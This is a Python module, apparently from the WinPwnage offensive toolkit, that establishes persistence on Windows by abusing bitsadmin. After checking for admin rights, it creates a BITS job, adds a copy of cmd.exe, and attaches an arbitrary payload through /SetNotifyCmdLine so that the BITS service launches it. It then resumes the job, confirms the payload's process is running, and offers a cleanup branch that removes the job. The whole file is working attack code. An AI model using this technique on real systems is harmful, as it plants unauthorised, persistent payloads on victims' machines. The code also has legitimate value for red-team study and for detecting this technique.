import os
import time
import tempfile
from winpwnage.core.prints import *
from winpwnage.core.utils import *
from winpwnage.core.winstructures import *

#Creds: https://oddvar.moe and https://github.com/3gstudent/bitsadminexec

bitsadmin_info = {
	"Description": "Gain persistence using bitsadmin",
	"Id": "12",
	"Type": "Persistence",
	"Fixed In": "99999" if information().admin() == True else "0",
	"Works From": "7600",
	"Admin": True,
	"Function Name": "persist_bitsadmin",
	"Function Payload": True,
}


def persist_bitsadmin(payload, name="", add=True):
	if not information().admin():
		print_error("Cannot proceed, we are not elevated")
		return False

	if add:
		if payloads().exe(payload):
			# if fails, anti-virus is probably blocking this method
			exit_code = process().create("bitsadmin.exe",
						params="/create {}".format(name), get_exit_code=True)

			if exit_code == 0:
				print_success("Successfully created job ({}) exit code ({})".format(name, exit_code))
			else:
				print_error("Unable to create job ({}) exit code ({})".format(name, exit_code))

			exit_code = process().create("bitsadmin.exe",
						params="/addfile {} {} {}".format(name,os.path.join(information().system_directory(),
						"cmd.exe"),os.path.join(tempfile.gettempdir(),"cmd.exe")),
						get_exit_code=True)

			if exit_code == 0:
				print_success("Successfully added file ({}) to specified job ({}) exit code ({})".format(os.path.join(information().system_directory(), "cmd.exe"), name, exit_code))
			else:
				print_error("Unable to add file ({}) to specified job ({}) exit code ({})".format(os.path.join(information().system_directory(), "cmd.exe"), name, exit_code))

			exit_code = process().create("bitsadmin.exe",
						params='/SetNotifyCmdLine {} {} NULL'.format(name,payload),
						get_exit_code=True)

			if exit_code == 0:
				print_success("Successfully attached payload ({}) to job ({}) exit code ({})".format(payload, name, exit_code))
			else:
				print_error("Unable to attach payload ({}) to job ({}) exit code ({})".format(payload, name, exit_code))

			exit_code = process().create("bitsadmin.exe",
						params="/Resume {}".format(name),
						get_exit_code=True)

			if exit_code == 0:
				print_success("Successfully initiated job ({}) exit code ({})".format(name, exit_code))
			else:
				print_error("Successfully initiated job ({}) exit code ({})".format(name, exit_code))

			time.sleep(5)

			pid = process().get_process_pid(os.path.split(payload)[1])
			if pid:
				print_success("Successfully started payload PID: {}".format(pid))
			else:
				print_error("Unable to start payload")
		else:
			print_error("Cannot proceed, invalid payload")
			return False
	else:
		print_info("Performing cleanup")
		exit_code = process().create("bitsadmin.exe",
					params="/complete {}".format(name),
					get_exit_code=True)

		if exit_code == 0:
			print_success("Successfully deleted job ({}) exit code ({})".format(name, exit_code))
		else:
			print_error("Unable to delete job ({}) exit code ({})".format(name, exit_code))